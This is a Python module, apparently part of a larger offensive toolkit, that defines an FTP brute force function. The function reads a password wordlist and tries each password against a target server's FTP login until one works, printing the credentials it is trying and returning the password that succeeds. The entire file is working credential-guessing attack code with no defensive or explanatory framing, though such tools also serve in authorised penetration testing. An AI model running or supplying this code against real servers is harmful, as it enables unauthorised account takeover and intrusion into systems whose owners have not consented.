from ftplib import FTP, error_perm
from typing import Optional
from .utils import clear_line


def ftp_bruteforce(
    host: str, username: str, wordlist_path: str, port: int = 21, timeout: int = 3
) -> Optional[str]:
    """
    Attempt FTP brute force attack using a password wordlist.

    Args:
        host (str): Target hostname or IP address.
        username (str): Username to authenticate.
        wordlist_path (str): Path to file containing passwords (one per line).
        port (int): FTP port. Defaults to 21.

    Returns:
        Optional[str]: The password if authentication succeeds; otherwise None.
    """
    with open(wordlist_path, "r") as file:
        for line in file:
            password = line.strip()

            clear_line()
            print(f"[?] Trying FTP {username}:{password}", end="\r")
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=timeout)
                ftp.login(user=username, passwd=password)
                print(f"[+] FTP login succeeded: {username}:{password}")
                ftp.quit()
                return password
            except error_perm:
                clear_line()
                print(f"[-] FTP login failed for {username}:{password}", end="\r")
                pass
            except Exception as e:
                clear_line()
                print(
                    f"Connection error or other FTP issues: {e}. Continuing...",
                    end="\r",
                )
                pass

    return None
